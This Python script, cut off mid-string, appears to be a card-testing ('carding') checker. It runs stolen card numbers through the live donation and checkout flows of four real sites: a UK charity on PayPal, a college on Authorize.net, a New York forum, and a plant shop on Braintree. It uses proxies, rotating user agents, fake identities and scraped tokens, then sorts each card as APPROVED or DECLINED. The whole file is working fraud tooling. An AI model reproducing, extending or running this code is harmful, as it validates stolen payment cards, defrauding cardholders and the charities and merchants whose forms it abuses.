import requests
import re
import base64
import random
import time
import uuid
import json
import cloudscraper
import traceback
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ============================================================================
# 🛠️ HELPER FUNCTIONS
# ============================================================================

def get_random_ua():
    return generate_user_agent(os=('linux', 'win'))

def format_proxy(proxy):
    """Formats proxy string to dictionary for requests"""
    if not proxy:
        return None
    try:
        if "http" in proxy:
            return {"http": proxy, "https": proxy}
        p = proxy.split(':')
        if len(p) == 4:
            url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
            return {"http": url, "https": url}
        elif len(p) == 2:
            url = f"http://{p[0]}:{p[1]}"
            return {"http": url, "https": url}
    except:
        return None
    return None

# ============================================================================
# 🚪 GATE 1: PayPal Commerce (SFTS)
# ============================================================================
def check_paypal_sfts(cc, proxy=None):
    try:
        # 1. Parse Card
        cc = cc.strip()
        parts = cc.split('|')
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        
        if "20" in yy and len(yy) == 4: 
            yy = yy.split("20")[1]
        
        # 2. Setup Session
        r = requests.Session()
        if proxy:
            r.proxies = format_proxy(proxy)
        
        user = generate_user_agent()
        headers_init = {'user-agent': user}
        
        # 3. Initial Request to Get Tokens
        response = r.get('https://sfts.org.uk/donate/', headers=headers_init)
        
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        
        enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)

        # 4. AJAX Donation Process
        headers = {
            'origin': 'https://sfts.org.uk',
            'referer': 'https://sfts.org.uk/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://sfts.org.uk/donate/',
            'give-form-url': 'https://sfts.org.uk/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'card_name': 'drgam ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give_action': 'purchase',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        
        r.post('https://sfts.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)

        # 5. Create Order Request
        fields_dict = {
            'give-honeypot': '',
            'give-form-id-prefix': id_form1,
            'give-form-id': id_form2,
            'give-form-title': '',
            'give-current-url': 'https://sfts.org.uk/donate/',
            'give-form-url': 'https://sfts.org.uk/donate/',
            'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': nonec,
            'give-price-id': '3',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00',
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': 'DRGAM',
            'give_last': 'rights and',
            'give_email': 'drgam22@gmail.com',
            'card_name': 'drgam ',
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
        }

        multipart_data = MultipartEncoder(fields=fields_dict)
        headers.update({'content-type': multipart_data.content_type})
        params = {'action': 'give_paypal_commerce_create_order'}
        response = r.post(
            'https://sfts.org.uk/wp-admin/admin-ajax.php',
            params=params,
            cookies=r.cookies,
            headers=headers,
            data=multipart_data
        )
        
        tok = response.json()['data']['id']
        
        # 6. PayPal Confirm Payment Source
        pp_headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {au}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data)

        # 7. Final Approve Order
        multipart_data_approve = MultipartEncoder(fields=fields_dict)
        headers.update({'content-type': multipart_data_approve.content_type})
        params_approve = {
            'action': 'give_paypal_commerce_approve_order',
            'order': tok,
        }
        
        response = r.post(
            'https://sfts.org.uk/wp-admin/admin-ajax.php',
            params=params_approve,
            cookies=r.cookies,
            headers=headers,
            data=multipart_data_approve
        )
        
        # 8. Result Handling
        text = response.text
        if 'true' in text or 'sucsess' in text: return "Charge !", "APPROVED"
        elif 'DO_NOT_HONOR' in text: return "Do not honor", "DECLINED"
        elif 'ACCOUNT_CLOSED' in text: return "Account closed", "DECLINED"
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text: return "Account closed", "DECLINED"
        elif 'LOST_OR_STOLEN' in text: return "LOST OR STOLEN", "DECLINED"
        elif 'CVV2_FAILURE' in text: return "Card Issuer Declined CVV", "DECLINED"
        elif 'SUSPECTED_FRAUD' in text: return "SUSPECTED FRAUD", "DECLINED"
        elif 'INVALID_ACCOUNT' in text: return 'INVALID_ACCOUNT', "DECLINED"
        elif 'REATTEMPT_NOT_PERMITTED' in text: return "REATTEMPT NOT PERMITTED", "DECLINED"
        elif 'ACCOUNT BLOCKED BY ISSUER' in text: return "ACCOUNT_BLOCKED_BY_ISSUER", "DECLINED"
        elif 'ORDER_NOT_APPROVED' in text: return 'ORDER_NOT_APPROVED', "DECLINED"
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text: return 'PICKUP_CARD_SPECIAL_CONDITIONS', "DECLINED"
        elif 'PAYER_CANNOT_PAY' in text: return "PAYER CANNOT PAY", "DECLINED"
        elif 'INSUFFICIENT_FUNDS' in text: return 'Insufficient Funds', "APPROVED"
        elif 'GENERIC_DECLINE' in text: return 'GENERIC_DECLINE', "DECLINED"
        elif 'COMPLIANCE_VIOLATION' in text: return "COMPLIANCE VIOLATION", "DECLINED"
        elif 'TRANSACTION_NOT PERMITTED' in text: return "TRANSACTION NOT PERMITTED", "DECLINED"
        elif 'PAYMENT_DENIED' in text: return 'PAYMENT_DENIED', "DECLINED"
        elif 'INVALID_TRANSACTION' in text: return "INVALID TRANSACTION", "DECLINED"
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text: return "RESTRICTED OR INACTIVE ACCOUNT", "DECLINED"
        elif 'SECURITY_VIOLATION' in text: return 'SECURITY_VIOLATION', "DECLINED"
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text: return "DECLINED DUE TO UPDATED ACCOUNT", "DECLINED"
        elif 'INVALID_OR_RESTRICTED_CARD' in text: return "INVALID CARD", "DECLINED"
        elif 'EXPIRED_CARD' in text: return "EXPIRED CARD", "DECLINED"
        elif 'CRYPTOGRAPHIC_FAILURE' in text: return "CRYPTOGRAPHIC FAILURE", "DECLINED"
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text: return "TRANSACTION CANNOT BE COMPLETED", "DECLINED"
        elif 'DECLINED_PLEASE_RETRY' in text: return "DECLINED PLEASE RETRY LATER", "DECLINED"
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text: return "EXCEED LIMIT", "DECLINED"
        else:
            try:
                return response.json()['data']['error'], "DECLINED"
            except:
                return "UNKNOWN_ERROR", "ERROR"

    except Exception as e:
        return f"Process Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 2: Morris.edu Authorize.net
# ============================================================================
def check_morris_authnet(cc, proxy=None):
    """
    Attempts a $1 donation on morris.edu using Authorize.net.
    Returns (message, status)
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) != 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts
        if len(yy) == 2:
            yy = '20' + yy

        session = requests.Session()
        if proxy:
            session.proxies = format_proxy(proxy)

        # 1. Get donation page to extract client key
        headers1 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.google.com/',
            'User-Agent': get_random_ua(),
            'Upgrade-Insecure-Requests': '1',
        }
        r1 = session.get('https://www.morris.edu/donate-now', headers=headers1, timeout=20)
        if r1.status_code != 200:
            return f"Initial page failed: {r1.status_code}", "ERROR"

        cl_match = re.search(r'"ClientKey":"(.*?)"', r1.text)
        if not cl_match:
            return "ClientKey not found", "ERROR"
        cl = cl_match.group(1)

        # 2. Get payment token from Authorize.net
        headers2 = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://www.morris.edu',
            'Referer': 'https://www.morris.edu/',
            'User-Agent': get_random_ua(),
        }
        payload2 = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '32rW7qTZdf',
                    'clientKey': cl,
                },
                'data': {
                    'type': 'TOKEN',
                    'id': 'a155e32b-390f-e237-0f13-d2d6b6a7811c',
                    'token': {
                        'cardNumber': n,
                        'expirationDate': f'{mm}{yy[-2:]}',  # MMYY
                    },
                },
            },
        }
        r2 = session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers2, json=payload2, timeout=20)
        if r2.status_code != 200:
            return f"Authorize.net token error: {r2.status_code}", "ERROR"
        data_value = re.search(r'"dataValue":"(.*?)"', r2.text)
        if not data_value:
            return "No dataValue in response", "ERROR"
        token = data_value.group(1)

        # 3. Submit donation
        headers3 = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://www.morris.edu',
            'Referer': 'https://www.morris.edu/',
            'User-Agent': get_random_ua(),
            'X-Requested-With': 'XMLHttpRequest',
        }
        # Generate random email
        rand_email = ''.join(random.choices(string.ascii_lowercase, k=10)) + '@gmail.com'
        payload3 = {
            'CustomFieldKeyValueList': {
                'gift_source': ['Alumni', '1', 'Gift Source'],
                'gift_designation': ['Alumni Fund Drive', '1', 'Gift Designation'],
                'i_would_like_this_gift_to_remain_anonymous': ['Yes', '1', 'I would like this gift to remain anonymous'],
            },
            'DataDescriptor': 'COMMON.ACCEPT.INAPP.PAYMENT',
            'DataValueNonce': token,
            'CurrentURL': '/donate-now',
            'NodeID': '29522',
            'PaymentMethodID': '2',
            'Amount': '1.00',
            'FormBlockID': '494',
            'ItemName': 'undefinedAlumniAlumni Fund Dri',
            'FirstName': 'anans',
            'LastName': 'asdwr',
            'BillingAddress1': '216 St James Ave',
            'BillingAddress2': '216 St James Ave',
            'BillingCity': 'Goose Creek',
            'BillingState': 'New York',
            'BillingZip': '10080',
            'BillingCountry': '',
            'PhoneNumber': '843-863-8882',
            'Email': rand_email,
        }
        r3 = session.post('https://www.morris.edu/Page/IndexPCI', headers=headers3, json=payload3, timeout=20)
        result = r3.json()
        error_msg = result.get('ErrorMessage', '')
        if error_msg:
            # If the error message is a decline, return DECLINED
            return error_msg, "DECLINED"
        else:
            return "Unknown success (check manually)", "APPROVED"
    except Exception as e:
        return f"Process Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 3: NYEnergyForum (ASP.NET donation)
# ============================================================================
def check_nyenergyforum(cc, proxy=None):
    """
    Attempts a $5 donation on nyenergyforum.org.
    Returns (message, status)
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) != 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts
        if len(yy) == 2:
            yy = '20' + yy
        yy_short = yy[2:]

        session = requests.Session()
        if proxy:
            session.proxies = format_proxy(proxy)

        # 1. Get donation form to extract viewstate values
        headers1 = {
            'authority': 'www.nyenergyforum.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://www.nyenergyforum.org/',
            'user-agent': get_random_ua(),
        }
        r1 = session.get('https://www.nyenergyforum.org/donate', headers=headers1, timeout=20)
        if r1.status_code != 200:
            return f"Initial page failed: {r1.status_code}", "ERROR"

        def extract(name):
            m = re.search(r'id="' + name + r'" value="(.*?)"', r1.text)
            return m.group(1) if m else None

        __VIEWSTATEGENERATOR = extract('__VIEWSTATEGENERATOR')
        __EVENTVALIDATION = extract('__EVENTVALIDATION')
        __VIEWSTATEFIELDCOUNT = extract('__VIEWSTATEFIELDCOUNT')
        __VIEWSTATE = extract('__VIEWSTATE')
        viewstates = []
        for i in range(1, 18):
            vs = extract(f'__VIEWSTATE{i}')
            if vs:
                viewstates.append(vs)

        if not __VIEWSTATEGENERATOR or not __EVENTVALIDATION or not __VIEWSTATE:
            return "Missing ASP.NET fields", "ERROR"

        if n.startswith('4'):
            cardtype = 'Visa'
        elif n.startswith('5'):
            cardtype = 'MasterCard'
        elif n.startswith('3'):
            cardtype = 'American Express'
        else:
            cardtype = 'Visa'

        # 2. Submit donation
        data = {
            'ctl00$SearchInput1$txtSearch': '',
            'ctl00$mainContent$ctl00$Donation': '$5.00',
            'ctl00$mainContent$ctl00$FirstName': 'tome',
            'ctl00$mainContent$ctl00$LastName': 'nwe',
            'ctl00$mainContent$ctl00$JobTitle': '',
            'ctl00$mainContent$ctl00$Organization': 'Tome',
            'ctl00$mainContent$ctl00$Email': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)) + '@gmail.com',
            'ctl00$mainContent$ctl00$Phone': '12703109664',
            'ctl00$mainContent$ctl00$BillingCountry': 'USA',
            'ctl00$mainContent$ctl00$BillingAddress': 'Rts 58',
            'ctl00$mainContent$ctl00$BillingAddress2': '',
            'ctl00$mainContent$ctl00$BillingCity': 'Iegdjwvx',
            'ctl00$mainContent$ctl00$BillingState': 'NY',
            'ctl00$mainContent$ctl00$BillingZip': '10080',
            'ctl00$mainContent$ctl00$CardFirstName': 'Tome',
            'ctl00$mainContent$ctl00$CardLastName': 'Napo',
            'ctl00$mainContent$ctl00$CardType': cardtype,
            'ctl00$mainContent$ctl00$CardNumber': n,
            'ctl00$mainContent$ctl00$CardExpirationMonth': mm,
            'ctl00$mainContent$ctl00$CardExpirationYear': yy_short,
            'ctl00$mainContent$ctl00$CardCode': cvc,
            '__EVENTTARGET': 'ctl00$mainContent$ctl00$Submit',
            '__EVENTARGUMENT': '',
            '__LASTFOCUS': '',
            '__VIEWSTATEFIELDCOUNT': __VIEWSTATEFIELDCOUNT,
            '__VIEWSTATE': __VIEWSTATE,
            '__VIEWSTATEGENERATOR': __VIEWSTATEGENERATOR,
            '__EVENTVALIDATION': __EVENTVALIDATION,
        }
        for i, vs in enumerate(viewstates, start=1):
            data[f'__VIEWSTATE{i}'] = vs

        headers2 = {
            'authority': 'www.nyenergyforum.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.nyenergyforum.org',
            'referer': 'https://www.nyenergyforum.org/donate',
            'user-agent': get_random_ua(),
        }
        r2 = session.post('https://www.nyenergyforum.org/donate', headers=headers2, data=data, timeout=20)
        msg = r2.text

        if 'Thank you for your order.' in msg or 'Thank you' in msg or 'success' in msg.lower():
            return "Thank You For Your Donation", "APPROVED"
        else:
            pattern = r'<strong>Please\s+correct\s+the\s+following:</strong>\s*<ul>\s*<li>(.*?)</li>'
            match = re.search(pattern, msg, re.DOTALL)
            if match:
                err = match.group(1).strip()
                return err, "DECLINED"
            return "Unknown decline", "DECLINED"
    except Exception as e:
        return f"Process Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 4: PlantVine (Braintree) – from payzzz
# ============================================================================
def check_plantvine(cc, proxy=None):
    """
    Attempts to add a payment method on plantvine.com using Braintree.
    Returns (message, status)
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) != 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts
        if len(yy) == 2:
            yy = '20' + yy
        yy_short = yy[2:]

        session = requests.Session()
        if proxy:
            session.proxies = format_proxy(proxy)

        user = get_random_ua()
        session.headers.update({'User-Agent': user})

        # Helper to generate random email
        acc = ''.join(random.choices(string.ascii_lowercase, k=10)) + '@gmail.com'

        # Step 1: Add product to cart
        headers_add = {
            'Accept': '*/*',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.plantvine.com',
            'Referer': 'https://www.plantvine.com/product/expandable-moss-pole/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        params_add = {'wc-ajax': 'xoo_wsc_add_to_cart'}
        data_add = {
            'quantity': '1',
            'add-to-cart': ['223201', '223201'],
            'action': 'xoo_wsc_add_to_cart',
        }
        session.post('https://www.plantvine.com/', params=params_add, headers=headers_add, data=data_add)

        # Step 2: Go to checkout
        headers_checkout = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Referer': 'https://www.plantvine.com/product/natural-root-stimulant/',
            'Upgrade-Insecure-Requests': '1',
        }
        r_checkout = session.get('https://www.plantvine.com/checkout/', headers=headers_checkout)
        time.sleep(4)

        # Extract tokens
        check_match = re.search(r'checkout-nonce name=woocommerce-process-checkout-nonce value=(.*?)>', r_checkout.text)
        if not check_match:
            return "Nonce not found", "ERROR"
        check = check_match.group(1)

        aut_raw = re.search(r'var wc_braintree_client_token = \["(.*?)"\]', r_checkout.text)
        if not aut_raw:
            return "Braintree token not found", "ERROR"
        aut = aut_raw.group(1)
        base4 = base64.b64decode(aut).decode('utf-8', errors='ignore')
        au = base4.split('"authorizationFingerprint":')[1].split('"')[1]

        sec = re.search(r'update_order_review_nonce":"(.*?)"', r_checkout.text).group(1)

        # Step 3: Update order review (shipping info)
        headers_update = {
            'Accept': '*/*',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.plantvine.com',
            'Referer': 'https://www.plantvine.com/checkout/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        params_update = {'wc-ajax': 'update_order_review'}
        data_update = f'security={sec}&payment_method=braintree_cc&country=US&state=NJ&postcode=10090&city=tome&address=errtowm&address_2=&s_country=US&s_state=NJ&s_postcode=10090&s_city=tome&s_address=errtowm&s_address_2=&has_full_address=true&post_data=billing_first_name%3Dxhhzjsj%26billing_last_name%3Djsksk%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3Derrtowm%26billing_address_2%3D%26billing_city%3Dtome%26billing_state%3DNJ%26billing_postcode%3D10090%26billing_phone%3D790824177%26billing_email%3D{acc}%2540gmail.com%26mailchimp_woocommerce_newsletter%3D1%26account_password%3D%26shipping_first_name%3Dxhhzjsj%26shipping_last_name%3Djsksk%26shipping_company%3D%26shipping_country%3DUS%26shipping_address_1%3Derrtowm%26shipping_address_2%3D%26shipping_city%3Dtome%26shipping_state%3DNJ%26shipping_postcode%3D10090%26order_comments%3D%26wc_order_attribution_type%3Dtypein%26wc_order_attribution_url%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.plantvine.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2025-01-10%252019%253A34%253A15%26wc_order_attribution_session_pages%3D8%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26shipping_method%255B0%255D%3Dflat_rate%253A7%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_googlepay_nonce_key%3D%26braintree_googlepay_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%257B%2522device_session_id%2522%253A%2522837c48b540bf10177b45cb3bd9383f14%2522%252C%2522fraud_merchant_id%2522%253Anull%252C%2522correlation_id%2522%253A%2522670b38d38d233d11278f67d42b147bb7%2522%257D%26woocommerce-process-checkout-nonce={check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=flat_rate%3A7'
        session.post('https://www.plantvine.com/', params=params_update, headers=headers_update, data=data_update)

        # Step 4: Tokenize card via Braintree GraphQL
        headers_token = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
        }
        json_token = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '2863b4aa-1125-4646-aeb5-025ef07e7ea7',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy_short,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10090',
                            'streetAddress': 'errtowm',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        r_token = session.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=json_token)
        tok = r_token.json()['data']['tokenizeCreditCard']['token']

        # Step 5: Final checkout submission
        headers_final = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.plantvine.com',
            'Referer': 'https://www.plantvine.com/checkout/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        params_final = {'wc-ajax': 'checkout'}
        data_final = f'billing_first_name=xhhzjsj&billing_last_name=jsksk&billing_company=&billing_country=US&billing_address_1=errtowm&billing_address_2=&billing_city=tome&billing_state=NJ&billing_postcode=10090&billing_phone=790824177&billing_email={acc}%40gmail.com&mailchimp_woocommerce_newsletter=1&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&wc_order_attribution_type=typein&wc_order_attribution_url=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.plantvine.com%2Fcart%2F&wc_order_attribution_session_start_time=2025-01-10+19%3A34%3A15&wc_order_attribution_session_pages=7&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A7&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22device_session_id%22%3A%22168387d563becc11080bb4943aff34c5%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22c7cf845f2aa91a87539423392ae5e06b%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F6wymr2jqbc63z5t5%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F6wymr2jqbc63z5t5%22%7D%2C%22merchantId%22%3A%226wymr2jqbc63z5t5%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%226wymr2jqbc63z5t5%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22PlantVine%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzY2MjQxNjUsImp0aSI6ImQ2YmNkMjE0LTBmNGEtNGU2ZC1hNjBmLWUwNTQwYjY3MjcxNyIsInN1YiI6IjZ3eW1yMmpxYmM2M3o1dDUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjZ3eW1yMmpxYmM2M3o1dDUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.3l8gwCZEW6qSjEJ9x4jJtOgknesk41EsipxK_CeDsUdhG24L-kwE--iB5uj7AHHmwpOsQGyNhxjSF7sRnXX_fQ%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%2